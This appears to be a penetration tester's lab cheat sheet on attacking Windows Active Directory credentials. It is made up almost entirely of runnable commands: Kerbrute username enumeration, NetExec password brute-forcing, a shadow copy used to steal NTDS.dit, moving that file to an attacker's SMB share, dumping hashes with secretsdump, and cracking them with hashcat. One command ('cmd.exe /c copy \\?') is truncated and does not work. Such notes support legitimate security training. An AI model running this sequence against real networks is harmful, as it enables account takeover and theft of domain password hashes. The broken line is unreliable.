Things covered 
* Dictionary attacks
* AD accounts
* Dumping Hashes
* NTDS.dit

Once a Windows system is joined to a domain it will no longer default to referencing the SAM database to validate logon requests.
### Dictionary Attacks
Using `Username Anarchy` will help generate commonly formatted name into usernames.
`./username-anarchy -i /home/user/user.txt`
#### Enumerating Username with Kerbrute
`./kerbrute_linux_amd64 userenum --dc <ip> --domain <domain.local> names.txt
#### Using NetExec to BruteForce
`netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`

### Capturing NTDS.dit
```bash
# Looking for things such as local admin or domain admins group
net localgroup

# Checking with the current user, one can find the permissions at the bottom of the cmd shell
net user <logged in user>

# Next one can create a shadow copy of the C file.
vssadmin CREATE SHADOW /For=C:

# Before grabbing the NTDS.dit, looking through the SAM and the LSASS might be a better start and to end with the NTDS.dit
cmd.exe /c copy \\?

# Make sure to have an SMB server active to transfer the files needed for the extraction
cmd.exe /c move C:\NTDS\NTDS.dit \\<Your IP>\share
```

#### Impacket-Secretsdump
```bash
# Back on the host machine
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
#### Using NetExec
```bash
# Capturing
netexec smb <IP> -u user -p pass -M ntdsutil

# Cracking the Hashes
sudo hashcat -m 1000 '64f12cddaa88057e06a81b54e73b949b' /usr/share/wordlists/rockyou.txt
```


# Git Repos

[kerbrute](https://github.com/ropnop/kerbrute.git)
[username-anarchy](https://github.com/urbanadventurer/username-anarchy.git)
